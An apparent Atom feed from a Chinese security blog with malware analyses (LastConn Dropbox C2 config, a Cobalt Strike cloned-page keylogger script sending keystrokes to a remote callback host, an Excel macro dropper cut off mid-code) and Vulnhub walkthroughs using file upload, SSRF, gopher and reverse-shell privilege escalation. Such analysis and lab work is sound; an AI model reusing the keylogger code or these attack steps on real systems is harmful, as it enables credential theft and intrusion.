<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2021-06-19T17:55:03.732Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>LastConn 样本简陋分析</title>
    <link href="http://422926799.github.io/posts/519d2f5e.html"/>
    <id>http://422926799.github.io/posts/519d2f5e.html</id>
    <published>2021-06-19T17:35:48.000Z</published>
    <updated>2021-06-19T17:55:03.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事件来源"><a href="#事件来源" class="headerlink" title="事件来源"></a>事件来源</h2><p>事件来源：<a href="https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由.NET开发<br><img src="https://z3.ax1x.com/2021/06/20/Rimgyj.png" alt=""></p><p>使用混淆器混淆过，de4dot 也无法完全反混淆，但它能够清除一些混淆<br>完全混淆：<br><img src="https://z3.ax1x.com/2021/06/20/Rim2Os.png" alt=""></p><p>部分混淆清除后:<br><img src="https://z3.ax1x.com/2021/06/20/RimWmn.png" alt=""></p><p>入口点</p><pre><code class="c#">private static void LsfApkF4M(){            Application.EnableVisualStyles(); //启用视觉样式            if (Program.nigDBMdtyE5deZClpF != null)            {            }            Application.SetCompatibleTextRenderingDefault(false); //在应用程序范围内设置控件显示文本的默认方式(true使用GDI+方式显示文本|false使用GDI方式显示文本.)            if (Program.V9yJ8yp9ahRYqnZDsG())  //Program.nigDBMdtyE5deZClpF == null            {                w4X4wl9MxwlqqYZEne.cBFhC9cq2dv3Z();                if (Program.nigDBMdtyE5deZClpF == null)                {                    Application.Run(new Form1());                }            }}</code></pre><p>进入到cBFhC9cq2dv3Z函数（判断当前时间减去 2021/6/16/时间戳判断是否大于14天）<br><img src="https://z3.ax1x.com/2021/06/20/Rim5kV.png" alt=""></p><p>大于或等于14天，在 2021-06-16 之后 14 天不能运行，过了这一步检测。进入Form1函数<br><img src="https://z3.ax1x.com/2021/06/20/RimIYT.png" alt=""></p><p>获取主机名+当前用户名<br><img src="https://z3.ax1x.com/2021/06/20/RimofU.png" alt=""></p><p>用户路径的临时文件夹路径获取<br><img src="https://z3.ax1x.com/2021/06/20/Rim7pF.png" alt=""></p><p>检查是否有域的存在<br><img src="https://z3.ax1x.com/2021/06/20/RimHl4.png" alt=""></p><p>获取系统制造商名称<br><img src="https://z3.ax1x.com/2021/06/20/Rimb6J.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimqX9.png" alt=""></p><p>解密资源文件里无名的资源<br><img src="https://z3.ax1x.com/2021/06/20/RimOmR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimX01.png" alt=""></p><p>经过解密得到的为一份配置文件<br><img src="https://z3.ax1x.com/2021/06/20/RimztK.png" alt=""></p><pre><code>txt_Totime=60 //超时时间@txt_Ftime=50@txt_FristTimeConn=45@txt_PathDir=C:\Users\Public\Downloads //下载存放路径@txt_PassRar=1D1VQB4G8Q //压缩包解压密码@txt_Mutex=NVQAGGMV22CY37LNUO9T5CZVS@txt_KeyPath=SOFTWARE\Box@txt_LastConn=LastConn.txt@txt_ShellCode=ShellCode.txt@txt_ListFile=ListFile.txt@txt_isdownload=isdownload.txt@txt_FileToDown=FileToDown.txt@txt_TokenRunOne=O1P6jtSegunFJIAAAAAAAAAAS-BcSjDEdrK0SsV7BAHes97oBWke06Lhg8ThncuyCCy@txt_FileName=Viewfile //下载的压缩包名@txt_MyToken=O1PWT9LGL1As7EAAAAAAAAAAe6Oc-OILc7Y0SU9OIAFll1nElPBz_uE467zscqimYfd@txt_FileOpen=news.doc //诱饵文档@txt_Setting=Setting</code></pre><p>打开注册表路径HKEY_CURRENT_USER\SOFTWARE\Box，如果不存在则创建。然后从该路径读取名为OneFile的键值名称，如果不存在会退出进程，存在则进入到yExgOgDEb函数调用<br><img src="https://z3.ax1x.com/2021/06/20/Rin9pD.png" alt=""></p><p>先返回系统的语言<br><img src="https://z3.ax1x.com/2021/06/20/RinC1e.png" alt=""></p><p>返回系统版本信息<br><img src="https://z3.ax1x.com/2021/06/20/RinP6H.png" alt=""></p><p>返回一系列信息，然后上传到远端，利用Dropbox API 下载Viewfile.rar<br>利用rar命令行解压压缩包<br><img src="https://z3.ax1x.com/2021/06/20/RiniXd.png" alt=""></p><p>根据原文的报告，会从此处下载<br><img src="https://z3.ax1x.com/2021/06/20/RinA0I.png" alt=""></p><blockquote><p>第四个也是最后一个能力是命令处理。“txt_FileToDown”文件是使用“txt_Setting”文件中收到的身份验证令牌从 Dropbox 下载的。如果有任何命令要执行，该文件将包含换行符分隔的“<command>=<command arguments="">”条目。命令包括：<br>DFileDrop – 下载并执行托管在恶意软件 Dropbox 上的文件<br>DFromUrl – 下载并执行托管在 URL 上的文件<br>Cmd – 执行 cmd.exe 命令并通过“txt_ShellCode”文件将结果发送回恶意软件的 Dropbox<br>Powershell – 类似于“Cmd”，但适用于 Powershell<br>WMIC - 类似于“Cmd”，但用于 WMIC<br>ListFile – 获取指定的文件列表并将结果通过“txt_ListFile”文件发送回恶意软件的 Dropbox<br>UploadFiles – 在恶意软件的 Dropbox 上创建文件夹并将指定的文件上传到其中<br>屏幕截图 – 截取屏幕截图并上传到恶意软件的 Dropbox<br>GetIP – 通过 hxxps://api.ipify.org 获取 IP 地址并上传到恶意软件的 Dropbox<br>执行命令后，其条目将从“txt_FileToDown”文件中删除，并将该文件重新上传到恶意软件的 Dropbox。   </p></blockquote><p>该杨本所有混淆字符串解密：<a href="https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt" target="_blank" rel="noopener">https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt</a><br>沙盒链接：<a href="https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>混淆的cs，配合Dropbox做c2是个不错的选择</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;事件来源&quot;&gt;&lt;a href=&quot;#事件来源&quot; class=&quot;headerlink&quot; title=&quot;事件来源&quot;&gt;&lt;/a&gt;事件来源&lt;/h2&gt;&lt;p&gt;事件来源：&lt;a href=&quot;https://www.proofpoint.com/us/blog/threat-insigh</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub ARAGOG</title>
    <link href="http://422926799.github.io/posts/21b3e8d6.html"/>
    <id>http://422926799.github.io/posts/21b3e8d6.html</id>
    <published>2021-06-16T12:46:42.000Z</published>
    <updated>2021-06-16T13:18:25.393Z</updated>
    
    <content type="html"><![CDATA[<p>靶场链接:<a href="http://www.vulnhub.com/entry/harrypotter-aragog-102,688/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/16/2XcHoQ.png" alt=""></p><p>gobuster web扫描<br><img src="https://z3.ax1x.com/2021/06/16/2XcOWn.png" alt=""></p><p>访问/blog发现是个wordpress<br><img src="https://z3.ax1x.com/2021/06/16/2XgR7F.png" alt=""></p><p>需要添加hosts  (这里我已经添加了)<br><img src="https://z3.ax1x.com/2021/06/16/2X2FHS.png" alt=""></p><p>wpscan扫描wordpress<br>（存在wp-admin用户）<br><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>插件扫描,存在wp-file-manager插件，版本6.0</p><pre><code>wpscan --url http://aragog.hogwarts/blog -t 20 --plugins-detection aggressive</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>这个版本存在任意文件上传，利用该洞getshell即可<br><img src="https://z3.ax1x.com/2021/06/16/2XRCG9.png" alt=""></p><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/16/2XRix1.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到flag，并得知/home目录下查找ginny和hagrid98用户<br><img src="https://z3.ax1x.com/2021/06/16/2XRtIg.png" alt=""></p><p>原本以为/var/www/html下是存放wordpress的路径，查看后发现不是。最后在/usr/share/wordpress发现数据库配置文件</p><pre><code>find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot;find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot; | grep &quot;config&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XR4Q1.png" alt=""></p><p>查询数据库得到wp-admin用户的密码</p><pre><code>use wordpress;select * from wp_users;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XRjSA.png" alt=""></p><p>cmd5查询得到密码<br><img src="https://z3.ax1x.com/2021/06/16/2XWpef.png" alt=""></p><p>ssh撞密码得<br><img src="https://z3.ax1x.com/2021/06/16/2XWVln.png" alt=""></p><p>后续常规linux提权检测发现没有有用的东西，上pspy检测root权限的进程，最后发现有个定时任务执行/opt/.backup.sh<br><img src="https://z3.ax1x.com/2021/06/16/2XWBfH.png" alt=""></p><p>里面插入反弹shell等待即可获得root shell<br><img src="https://z3.ax1x.com/2021/06/16/2XW6Xt.png" alt=""></p><h2 id="wp-file-任意文件上传分析"><a href="#wp-file-任意文件上传分析" class="headerlink" title="wp-file 任意文件上传分析"></a>wp-file 任意文件上传分析</h2><p>漏洞点位于file manager的connector.minimal.php文件，具体路径在wordpress\wp-content\plugins\wp-file-manager\lib\php\connector.minimal.php<br><img src="https://z3.ax1x.com/2021/06/16/2XW7Xq.png" alt=""></p><p>首先实例化一个elFinderConnector对象，然后调用它的run()方法，跟进run()<br>跟进到FILES数据判断<br><img src="https://z3.ax1x.com/2021/06/16/2XfpcR.png" alt=""></p><p>最后调用exec函数进入到文件上传处理点<br><img src="https://z3.ax1x.com/2021/06/16/2XfAAO.png" alt=""></p><p>Upload函数（关键点是Content-Type类型存在image即进入文件保存）<br><img src="https://z3.ax1x.com/2021/06/16/2Xf8US.png" alt=""></p><p>详细分析链接:<a href="https://www.anquanke.com/post/id/216990" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216990</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;靶场链接:&lt;a href=&quot;http://www.vulnhub.com/entry/harrypotter-aragog-102,688/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entry/harry</summary>
      
    
    
    
    
    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub HarryPotter:Nagini</title>
    <link href="http://422926799.github.io/posts/a52d611e.html"/>
    <id>http://422926799.github.io/posts/a52d611e.html</id>
    <published>2021-06-14T15:53:34.000Z</published>
    <updated>2021-06-14T18:07:28.924Z</updated>
    
    <content type="html"><![CDATA[<p>vulnhub链接：<a href="http://www.vulnhub.com/entry/harrypotter-nagini,689/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap</p><pre><code>nmap -sV -A 192.168.93.225</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HE0Gd.png" alt=""></p><p>gobuster扫web</p><pre><code>gobuster dir -e -u http://192.168.93.225 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,rar,7z</code></pre><p><img src="https://z3.ax1x.com/2021/06/14/2HAxDf.png" alt=""></p><p>有个joomla CMS，进入后台就能通过模板getshell，除此之外还有个note.txt。访问如下<br><img src="https://z3.ax1x.com/2021/06/15/2HEXi4.png" alt=""></p><blockquote><p>提示用http3访问quic.nagini.hogwarts，将域添加进/etc/hosts</p></blockquote><p>得到提示的路径<br><img src="http://www.vxer.cn/zb_users/upload/2021/05/202105071620395007860213.png" alt="vxer.cn的图"></p><p>访问internalResourceFeTcher.php，存在SSRF漏洞<br>读取internalResourceFeTcher.php源码</p><pre><code>file:///var/www/html/internalResourceFeTcher.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVidO.png" alt=""> </p><p>读取/etc/passwd<br><img src="https://z3.ax1x.com/2021/06/15/2HVVWd.png" alt=""></p><p>读取joomla CMS数据库配置文件</p><pre><code>file:///var/www/html/joomla/configuration.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVuOP.png" alt=""></p><p>可以发现mysql没使用密码进行登录，意味着可以用ssrf访问mysql<br>》MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行</p><h2 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h2><p>利用gopherus.py生成gopher payload<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p><p><img src="https://z3.ax1x.com/2021/06/15/2HV2Ox.png" alt=""></p><blockquote><p>注意:然后我们必须使用浏览器的 url 访问该站点。（curl 在这里不起作用。）如果没有显示内容，只需刷新页面几次。<br><img src="https://z3.ax1x.com/2021/06/15/2HVWm6.png" alt=""></p></blockquote><p>数据库版本<br><img src="https://z3.ax1x.com/2021/06/15/2HVwwT.png" alt=""></p><p>查看joomla数据库所有表<br><img src="https://z3.ax1x.com/2021/06/15/2HZkn0.png" alt=""></p><p>读取joomla_users<br><img src="https://z3.ax1x.com/2021/06/15/2HZABV.png" alt=""></p><p>查看后发现hash无法破解，直接将md5替换掉site_admin的用户然后在登录即可<br><img src="https://z3.ax1x.com/2021/06/15/2HZeNF.png" alt=""></p><p>登录后台<br>joomla/administrator<br><img src="https://z3.ax1x.com/2021/06/15/2HZu9J.png" alt=""></p><p>找到模板处写shell<br>(尝试phpinfo)<br><img src="https://z3.ax1x.com/2021/06/15/2HZK39.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HZQj1.png" alt=""></p><p>php_reverse_shell<br><img src="https://z3.ax1x.com/2021/06/15/2HZwjI.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>home目录下有两个用户snape,hermoine<br><img src="https://z3.ax1x.com/2021/06/15/2HZDDP.png" alt=""></p><p>在/home/snape目录下找到hermoine用户的ssh密码<br><img src="https://z3.ax1x.com/2021/06/15/2HuYqI.png" alt=""></p><p>登录后利用发现的SUID cp文件，将ssh公钥拷贝到/home/hermoine/.ssh/authorized_keys<br><img src="https://z3.ax1x.com/2021/06/15/2HuNZt.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuUdP.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuaIf.png" alt=""></p><p>实现私钥登录hermoine用户<br><img src="https://z3.ax1x.com/2021/06/15/2Huwi8.png" alt=""></p><p>用户目录下存在firefox的数据，scp下载到本地解密得到root密码<br><a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0" target="_blank" rel="noopener">https://github.com/unode/firefox_decrypt/releases/tag/0.7.0</a><br><img src="https://z3.ax1x.com/2021/06/15/2Hu0JS.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuBRg.png" alt=""></p><p>得到最后的flag<br><img src="https://z3.ax1x.com/2021/06/15/2HuDzQ.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.vxer.cn/?id=80" target="_blank" rel="noopener">http://www.vxer.cn/?id=80</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vulnhub链接：&lt;a href=&quot;http://www.vulnhub.com/entry/harrypotter-nagini,689/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entry/harr</summary>
      
    
    
    
    
    <category term="靶场" scheme="http://422926799.github.io/tags/靶场/"/>
    
  </entry>
  
  <entry>
    <title>hacksudo fgo</title>
    <link href="http://422926799.github.io/posts/2f666841.html"/>
    <id>http://422926799.github.io/posts/2f666841.html</id>
    <published>2021-06-10T12:16:16.000Z</published>
    <updated>2021-06-10T12:30:42.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RY6O0.png" alt=""></p><p>开放了80、21、3306、22</p><p>路径扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RYRTU.png" alt=""></p><p>访问dict.txt得到一份字典，ftp爆破。得到正确密码<br><img src="https://z3.ax1x.com/2021/06/10/2RYXkD.png" alt=""></p><p>ftp登录上去，发现两个目录。东西全部下载下来<br><img src="https://z3.ax1x.com/2021/06/10/2RtAAS.png" alt=""></p><p>其中压缩包里wav后缀结尾的文件是凯撒加密，解密得到后台密码<br><img src="https://z3.ax1x.com/2021/06/10/2Rtm1s.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtUj1.png" alt=""></p><p>文件上传copy改名得到shell</p><p><img src="https://z3.ax1x.com/2021/06/10/2Rt69H.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtDAO.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/10/2RtggA.png" alt=""></p><p>发现SUID<br><img src="https://z3.ax1x.com/2021/06/10/2Rt5E8.png" alt=""></p><p>利用look读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/10/2RtzUU.png" alt=""></p><p>john破解hash<br><img src="https://z3.ax1x.com/2021/06/10/2RNC8J.png" alt=""></p><p>登录得到user.txt，发现该用户目录下存在二进制文件fog<br><img src="https://z3.ax1x.com/2021/06/10/2RNEb6.png" alt=""></p><p>经过IDA分析，发现是setuid(0)/setguid(0)后调用python，而属主是root。可利用其提权<br><img src="https://z3.ax1x.com/2021/06/10/2RNrq0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RNtIS.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;开局nmap扫描&lt;br&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/06/10/2RY6O0.pn</summary>
      
    
    
    
    
    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
    
  </entry>
  
  <entry>
    <title>cs钓鱼克隆网站分析</title>
    <link href="http://422926799.github.io/posts/9efc32ef.html"/>
    <id>http://422926799.github.io/posts/9efc32ef.html</id>
    <published>2021-06-10T09:49:12.000Z</published>
    <updated>2021-06-10T09:54:48.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>cs克隆<br><img src="https://z3.ax1x.com/2021/06/10/2RieSA.png" alt=""></p><p>克隆后的html和原html对比<br><img src="https://z3.ax1x.com/2021/06/10/2RilTS.png" alt=""></p><p>特征：</p><ol><li>IFRAME标签为大写，且长宽为0。</li><li>script标签加载了js路径为”/jquery/jquery.min.js”</li></ol><p>顺序特征:</p><ol><li>IFRAME标签和script标签同时出现时，一定是IFRAME标签、script标签和body标签这个顺序。</li><li>IFRAME标签和script标签只出现一个时，一定在body标签之前。</li></ol><p>引用的js分析：</p><pre><code class="javascript">var cfqPdaQzXzSSf = 0;window.onload = function loadfqPdaQzXzSSf() { //页面加载处理事件    lfqPdaQzXzSSf = &quot;,&quot;;    if (window.addEventListener)  { //对象触发指定的事件        document.addEventListener(&#39;keypress&#39;, pfqPdaQzXzSSf, true); //keypress所有键都会触发该事件，无论它们是否产生字符值 处理函数:pfqPdaQzXzSSf        document.addEventListener(&#39;keydown&#39;, dfqPdaQzXzSSf, true); //keydown当按下某个键时会触发该事件 处理函数:dfqPdaQzXzSSf    } else if (window.attachEvent)  { //attachEvent在IE9以下的版本中受到支持。其它的都支持addEventListener        document.attachEvent(&#39;onkeypress&#39;, pfqPdaQzXzSSf);        document.attachEvent(&#39;onkeydown&#39;, dfqPdaQzXzSSf);    } else { //两者都不支持全部置空        document.onkeypress = pfqPdaQzXzSSf;        document.onkeydown = dfqPdaQzXzSSf;    }}function pfqPdaQzXzSSf(e) {    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which; //只有当DOM事件处理程序被调用的时    kfqPdaQzXzSSf = kfqPdaQzXzSSf.toString(16); //将键盘码转换为ascii    if (kfqPdaQzXzSSf != &quot;d&quot;)  { //随便写个判断进入函数        fqPdaQzXzSSf(kfqPdaQzXzSSf);    }}function dfqPdaQzXzSSf(e) {    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which;    if (kfqPdaQzXzSSf == 9||kfqPdaQzXzSSf == 8||kfqPdaQzXzSSf == 13)  { //tab键，退格键，回车键        fqPdaQzXzSSf(kfqPdaQzXzSSf);    }}function fqPdaQzXzSSf(kfqPdaQzXzSSf) {    lfqPdaQzXzSSf = lfqPdaQzXzSSf + kfqPdaQzXzSSf + &quot;,&quot;; //键盘值拼接    var tfqPdaQzXzSSf = &quot;ZUyQXfawhPbi&quot; + cfqPdaQzXzSSf;    cfqPdaQzXzSSf++;    var ffqPdaQzXzSSf;    if (document.all&amp;&amp;(navigator.appVersion.match(/MSIE ([\d.]+)/)[1]) &lt;= 8.0)  { //浏览器版本判断是否小于或等于8.0        ffqPdaQzXzSSf = document.createElement(String.fromCharCode(60) + &quot;script name=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39; id=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39;&quot; + String.fromCharCode(62) + String.fromCharCode(60) + &quot;/script&quot; + String.fromCharCode(62));    } else {        ffqPdaQzXzSSf = document.createElement(&quot;script&quot;);        ffqPdaQzXzSSf.setAttribute(&quot;id&quot;, tfqPdaQzXzSSf);        ffqPdaQzXzSSf.setAttribute(&quot;name&quot;, tfqPdaQzXzSSf);    }    var ejDBFWFHhff = &#39;?id=&#39; + window.location.href.split(/\?id=/)[1]; //取键盘ascii码    ffqPdaQzXzSSf.setAttribute(&quot;src&quot;, &quot;http://10.23.66.18:8080/callback&quot; + ejDBFWFHhff + &quot;&amp;data=&quot; + lfqPdaQzXzSSf);    ffqPdaQzXzSSf.style.visibility = &quot;hidden&quot;;    document.body.appendChild(ffqPdaQzXzSSf); //实例化js，发送键盘码    if (kfqPdaQzXzSSf == 13||lfqPdaQzXzSSf.length &gt; 3000)  { //判断键盘码为回车键置空lfqPdaQzXzSSf变量        lfqPdaQzXzSSf = &quot;,&quot;;    }    setTimeout(&#39;document.body.removeChild(document.getElementById(&quot;&#39; + tfqPdaQzXzSSf + &#39;&quot;))&#39;, 5000); //延时5秒删除创建的js}</code></pre><p>页面加载处理事件,添加针对键盘按下的事件。触发事件的时候进入dfqPdaQzXzSSf和dfqPdaQzXzSSf函数处理，最后调用fqPdaQzXzSSf函数，将键盘码通过创建script标签将数据传送到远端。最后延迟5秒后删除创建的js</p><p>pfqPdaQzXzSSf函数：<br>键盘码转ascii码发送到fqPdaQzXzSSf函数</p><p>dfqPdaQzXzSSf函数：<br>如果按下tab键，退格键，回车键调用fqPdaQzXzSSf函数发送键盘</p><p><strong>chrome动态调试</strong><br><img src="https://z3.ax1x.com/2021/06/10/2RiDkF.png" alt="键盘码判断"></p><p><img src="https://z3.ax1x.com/2021/06/10/2RirY4.png" alt="键盘码拼接"></p><p><img src="https://z3.ax1x.com/2021/06/10/2Ri7pd.png" alt="js创建发送键盘码到远端"></p><p>cs远端接收的密码<br><img src="https://z3.ax1x.com/2021/06/10/2RiqXt.png" alt=""></p><p>360空间绘测特征搜索：</p><pre><code>response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;jquery/jquery.min.js\&quot;&gt;&lt;/script&gt; &lt;/body&gt;&quot;response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;WIDTH=\&quot;0\&quot; HEIGHT=\&quot;0\&quot;&gt;&lt;/IFRAME&gt;&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/10/2RF9pj.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析过程&quot;&gt;&lt;a href=&quot;#分析过程&quot; class=&quot;headerlink&quot; title=&quot;分析过程&quot;&gt;&lt;/a&gt;分析过程&lt;/h2&gt;&lt;p&gt;cs克隆&lt;br&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/06/10/2RieSA.png&quot; a</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>仿造Brown-Forman恶意文档分析</title>
    <link href="http://422926799.github.io/posts/5245e2ed.html"/>
    <id>http://422926799.github.io/posts/5245e2ed.html</id>
    <published>2021-06-08T17:47:43.000Z</published>
    <updated>2021-06-08T18:00:24.180Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>信息来源：<a href="https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m" target="_blank" rel="noopener">https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m</a><br><img src="https://z3.ax1x.com/2021/06/09/2so9S0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀：<a href="https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection</a></p><pre><code>MD5    4fb331e4e5c6094e731690371687b110SHA-1    bcecaaba6462550c61f7ed572e2c06ef8f3f378aSHA-256    b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7feVhash    ec726ed39dd1773fb0790767871cde5cSSDEEP    12288:HMc+2YnB6YTbkvA00E+XvQNBzcytqew5W99QPR69Ke+SajzvEnj/igo7tbhzdSNN:H8sYvkhRzdoW9yRCh+vwnj/it7vBSjTLSH    T148F423A542CEFD48EA3A3D3761C5039DA197ACEB93150F420E73DB22D99A6F32511F18</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2so30e.png" alt=""></p><p>执行流程<br><img src="https://z3.ax1x.com/2021/06/09/2so8TH.png" alt=""></p><p>下载下来，打开是典型的隐藏表执行宏<br><img src="https://z3.ax1x.com/2021/06/09/2soJkd.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2soYtA.png" alt=""></p><p>逐个提取出里面的vba，得到的结果是这样的<br><img src="https://z3.ax1x.com/2021/06/09/2sod6f.png" alt=""></p><pre><code>Auto_Open=AB16() ;=FORMULA.ARRAY(&#39;reierj ntrutruiret eruireur&#39;!AJ17&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ18&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ19&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ20&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ21&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ22&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ23&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ24,AB17)=Z16() ;Z16=CALL(AB17,AC17,&quot;JCJ&quot;,AD16,0) //Kernel32,,JCJ,C:/Users/Public,0=CALL(&quot;UR&quot;&amp;&#39;reierj ntrutruiret eruireur&#39;!AM18,&#39;reierj ntrutruiret eruireur&#39;!AN17&amp;&#39;reierj ntrutruiret eruireur&#39;!AN18&amp;&#39;reierj ntrutruiret eruireur&#39;!AN19&amp;&#39;reierj ntrutruiret eruireur&#39;!AN20&amp;&#39;reierj ntrutruiret eruireur&#39;!AN21&amp;&#39;reierj ntrutruiret eruireur&#39;!AN22&amp;&#39;reierj ntrutruiret eruireur&#39;!AN23&amp;&#39;reierj ntrutruiret eruireur&#39;!AN24&amp;&#39;reierj ntrutruiret eruireur&#39;!AN25&amp;&#39;reierj ntrutruiret 